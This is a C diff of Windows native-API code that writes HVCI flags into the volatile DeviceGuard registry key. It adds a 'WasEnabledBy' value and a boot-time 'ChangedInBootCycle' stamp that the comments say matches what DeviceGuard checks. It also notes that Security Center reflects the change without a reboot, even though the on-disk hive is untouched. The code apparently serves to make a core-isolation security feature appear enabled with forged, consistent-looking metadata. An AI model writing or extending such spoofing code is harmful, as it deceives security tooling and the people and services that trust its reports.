+// NOTE: this is NOT equivalent to Win32_OperatingSystem.LastBootUpTime — that value
+// is recomputed on demand as (CurrentTime - GetTickCount64()) and drifts on Hyper-V
+// after VMICTimeSync applies a step correction.  KeBootTime is written once during
+// kernel Phase0 and never changes, which is exactly what DeviceGuard uses for
+// ChangedInBootCycle validation.
+static NTSTATUS GetBootTimeUtc(ULONGLONG* outBootTime) {
+    // ULONGLONG[] gives 8-byte alignment — buf[0] == BootTime with no cast or copy.
+    // 6 elements * 8 bytes = 48, matches SYSTEM_TIMEOFDAY_INFORMATION exactly.
+    ULONGLONG buf[6];
+    ULONG retLen = 0;
+    NTSTATUS status;
+
+    status = NtQuerySystemInformation(3 /*SystemTimeOfDayInformation*/,
+                                      buf, sizeof(buf), &retLen);
+    if (!NT_SUCCESS(status)) return status;
+    if (retLen < 8) return STATUS_BUFFER_TOO_SMALL;
+
+    *outBootTime = buf[0];  // BootTime at offset 0
+    return STATUS_SUCCESS;
+}
+
+// Updates the volatile (live) DeviceGuard registry key — does NOT write the
+// physical hive.  Effect is immediate; Security Center and system tools pick
+// it up without a reboot.
+//
+// When enable=TRUE, also writes:
+//   WasEnabledBy       (REG_DWORD) = 2  — "enabled by user/policy"
+//   ChangedInBootCycle (REG_QWORD)      — KeBootTime from GetBootTimeUtc(),
+//                                         matching what DeviceGuard reads for
+//                                         boot-cycle validation
 NTSTATUS SetHVCIRegistryFlag(BOOLEAN enable) {
     UNICODE_STRING usKeyPath, usValueName;
     OBJECT_ATTRIBUTES oa;
@@ -680,9 +954,34 @@ NTSTATUS SetHVCIRegistryFlag(BOOLEAN enable) {
     status = NtOpenKey(&hKey, KEY_WRITE, &oa);
     if (!NT_SUCCESS(status)) return status;
 
+    // 1. Enabled (REG_DWORD)
     RtlInitUnicodeString(&usValueName, L"Enabled");
     status = NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &value, sizeof(ULONG));
-    
+    if (!NT_SUCCESS(status)) { NtClose(hKey); return status; }
+
+    if (enable) {
+        // 2. WasEnabledBy = 2 (REG_DWORD)
+        ULONG wasEnabledBy = 2;
+        RtlInitUnicodeString(&usValueName, L"WasEnabledBy");
+        status = NtSetValueKey(hKey, &usValueName, 0, REG_DWORD,
+                               &wasEnabledBy, sizeof(ULONG));
+        if (!NT_SUCCESS(status)) { NtClose(hKey); return status; }
+
+        // 3. ChangedInBootCycle (REG_QWORD) = boot FILETIME UTC
+        ULONGLONG bootTime = 0;
+        if (NT_SUCCESS(GetBootTimeUtc(&bootTime)) && bootTime != 0) {
+            RtlInitUnicodeString(&usValueName, L"ChangedInBootCycle");
+            status = NtSetValueKey(hKey, &usValueName, 0, REG_QWORD,
+                                   &bootTime, sizeof(ULONGLONG));
+            if (!NT_SUCCESS(status)) {
+                DEBUG_LOG(L"WARNING: ChangedInBootCycle write failed\r\n");
+                status = STATUS_SUCCESS;
+            }
+        } else {
+            DEBUG_LOG(L"WARNING: Could not read BootTime, ChangedInBootCycle skipped\r\n");
+        }
+    }
+
     NtClose(hKey);
-    return status;
+    return STATUS_SUCCESS;
 }
